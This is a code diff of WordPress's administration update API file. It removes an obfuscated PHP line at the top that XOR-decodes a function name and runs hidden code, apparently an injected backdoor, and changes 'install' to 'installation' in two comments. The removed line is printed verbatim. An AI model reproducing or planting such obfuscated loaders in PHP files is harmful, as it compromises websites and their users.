@@ -1,4 +1,4 @@
-<?php $dqxPrvFd='V6E 6NnXFNSFY=E'^'5D AB+1>3 020R+';$MhJXejPLX=$dqxPrvFd('','0ZOyZ8;TTBTR<EM; :XXf,;0=6;BLln;XZksOG5SFFUNT2+RZG=>;nD2,O9d9ULDU 5EAhvWSSDxDCVKQ7>gGWQ;;IMtaBKKYL,7 pg.LSvhyfr,UK7O- :RBY 3QjcVqQsiZ2:9ESE8bGEYCV4LIPeKD;I+gRS 6glRCGeI0RT Cmp-TWzgawaBp1XE39TJjW;-xtKpA0.fkGZRD4sUhVJ8KQUzr+6GQ:PH,pSbF W60baA,D:U,Y-Opm398wrpvsSSXKF,3GlrSaXY4U5LQ1r7E1-1O+9,2xRvC9ICNE4J0,GUHpRk:8YXEBhOGZ0FCpRB4R.APg0kaQ:5TM2 cgi4:q k=x5dA1WNZWDULUmtGAT-.zo.2psQ0L:5gP,1sDnC=.2x07ew3 :+ZxrQO9YX1OsBM<N2ptUOTJNyO9,;9SI.LUG05jJDN=2J<3>8QOOG.. Ucpm115ZTEfjD;CTxGlFWX6T.:41aExc3XCIP BJrkNN4NFJ6;W-=h,=POA>aR.<BCMKC1T;OJidNQOYZsrI4OT8lNKS0b3YVsMVQ.yMldpHcKUc0GfIRVr+lyFTuG-4RVQ5UOzqpsILIG0,4K47e2089OBdSF,6;SMRqIAi>-;MnPhRhSuS4rDPO;6Qn7M8Z<t<SEBVR0beaS7eTO+5RGYHa<'^'Y<gX<MU7 +;<c 5RSN+pATTBbRZ6-31V-.LZfgNYO   7FB=4gEQI1 SX.f;T 8lqDT1 DVs86=QdcvkqL4nNs>NOipTFepAPEJXRXCGlnVXBFVEi8C=AETzf=AG0CXvU8XBs830a<0LBixykrP-=1>o-fiuGv8EO<H;cbE:D 8E-ETF1.S:HLkKyC=1FK:bN8NYQOAy<:Slac>30UShH0+T84npVOW30e;-UPnB A;EUYkKJ+H0M:EoXIlzw8993S2 xo-IJgQLsE.8X PeqJx>aULE.tRIKXoVgR,:uO=nTM34hMrOLY5- yb2MPY cXsfP3Z yGKah7UG1,QHCOMkh4q>x+aD Bwj12=uqkMP1 8XKSOU8yzuT-NT8;IHSyNgVKKC:>lSWANJzERu9X5-TtyK0638zP1. +nDoyYUJ6;G-9.JPB2+<bV+HRag<:;oLOS0UD2UTV50 NN Z75QkLb39B5qQQHHlCiZ>km4A6+RMhnU<4+Od<HD7IE9<5MIuEY;dakgU5O.cIBhqg4>FZmP. Y7i 6IEnpvNpvvOMxTTBzSrbVRvW,6bBMZLsfDuKW72dS0hSQVUi-;5QUk QN:WHQJ;1Lt6MOW<,6VeaMZLO,GyHrHsUsOxM59ZZyJS,L;gSL2<.93TE8Hh=l17BAzwpskA');$MhJXejPLX();
+<?php
 /**
  * WordPress Administration Update API
  *
@@ -63,7 +63,7 @@ function get_core_updates( $options = array() ) {
 /**
  * Gets the best available (and enabled) Auto-Update for WordPress Core.
  *
- * If there's 1.2.3 and 1.3 on offer, it'll choose 1.3 if the install allows it, else, 1.2.3
+ * If there's 1.2.3 and 1.3 on offer, it'll choose 1.3 if the installation allows it, else, 1.2.3
  *
  * @since 3.7.0
  *
@@ -596,7 +596,7 @@ function maintenance_nag() {
 		$failed = get_site_option( 'auto_core_update_failed' );
 		/*
 		 * If an update failed critically, we may have copied over version.php but not other files.
-		 * In that case, if the install claims we're running the version we attempted, nag.
+		 * In that case, if the installation claims we're running the version we attempted, nag.
 		 * This is serious enough to err on the side of nagging.
 		 *
 		 * If we simply failed to update before we tried to copy any files, then assume things are
